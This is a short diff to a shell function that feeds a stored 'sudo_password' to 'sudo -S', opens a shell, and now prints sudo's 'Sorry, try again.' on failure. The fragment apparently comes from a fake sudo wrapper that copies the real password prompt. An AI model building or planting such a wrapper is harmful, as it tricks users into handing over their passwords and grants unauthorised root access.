@@ -32,6 +32,8 @@ attempts() {
         /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
         $BASH
         exit 0
+    else 
+        echo "Sorry, try again."
     fi
 }
 
